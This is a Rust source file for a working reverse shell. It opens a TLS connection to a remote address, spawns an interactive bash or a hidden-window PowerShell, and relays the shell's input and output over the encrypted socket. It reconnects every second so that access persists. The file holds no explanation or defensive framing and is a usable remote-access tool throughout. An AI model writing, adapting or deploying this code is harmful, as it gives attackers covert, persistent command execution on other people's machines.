use crate::rustls::pki_types::ServerName;
use std::process::Stdio;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_rustls::rustls;

#[cfg(target_os = "windows")]
const SHELL: &str = "powershell.exe";

#[cfg(target_os = "windows")]
const SHELL_ARGS: &[&str] = &["-WindowStyle", "hidden"]; // TODO redirect everything

#[cfg(any(target_os = "macos", target_os = "linux"))]
const SHELL: &str = "/bin/bash";

#[cfg(any(target_os = "macos", target_os = "linux"))]
const SHELL_ARGS: &[&str] = &["-i"];

async fn start_shell(addr: &str) -> tokio::io::Result<()> {
    // setup TLS
    let mut cert = include_bytes!("../certs/root-ca.pem").as_slice();
    let mut root = rustls::RootCertStore::empty();
    for c in rustls_pemfile::certs(&mut cert) {
        root.add(c.unwrap()).unwrap();
    }
    let cfg = rustls::ClientConfig::builder()
        .with_root_certificates(root)
        .with_no_client_auth();
    let conn = tokio_rustls::TlsConnector::from(std::sync::Arc::new(cfg));

    // start connection
    let sock = tokio::net::TcpStream::connect(addr).await?;
    let domain = ServerName::try_from(addr.split(':').next().unwrap().to_string()).unwrap();
    let mut sock = conn.connect(domain, sock).await?;

    // start shell
    let mut cmd = tokio::process::Command::new(SHELL)
        .args(SHELL_ARGS)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    // pipe stdin/stdout/stderr
    let mut stdin = cmd.stdin.take().unwrap();
    let mut stdout = cmd.stdout.take().unwrap();
    let mut stderr = cmd.stderr.take().unwrap();
    let _ = tokio::spawn(async move {
        let mut buf_in = [0; 1024];
        let mut buf_out = [0; 1024];
        let mut buf_err = [0; 1024];
        loop {
            tokio::select! {
                v = sock.read(&mut buf_in) => {
                    let v = v?;
                    match v {
                        0 => break,
                        len => stdin.write_all(&buf_in[0..len]).await?,
                    }
                }
                v = stdout.read(&mut buf_out) => {
                    let v = v?;
                    match v {
                        0 => break,
                        len => sock.write_all(&buf_out[0..len]).await?,
                    }
                }
                v = stderr.read(&mut buf_err) => {
                    let v = v?;
                    match v {
                        0 => break,
                        len => sock.write_all(&buf_err[0..len]).await?,
                    }
                }
            }
        }
        Ok::<(), tokio::io::Error>(())
    })
    .await;
    let _ = cmd.wait().await;
    Ok(())
}

#[tokio::main]
async fn main() {
    let addr = std::env::args()
        .nth(1)
        .unwrap_or("localhost:8080".to_string());
    loop {
        let err = start_shell(&addr).await;
        if let Err(msg) = err {
            println!("{}", msg);
        } else {
            println!("graceful exit");
        }
        tokio::time::sleep(tokio::time::Duration::from_millis(1000)).await;
    }
}
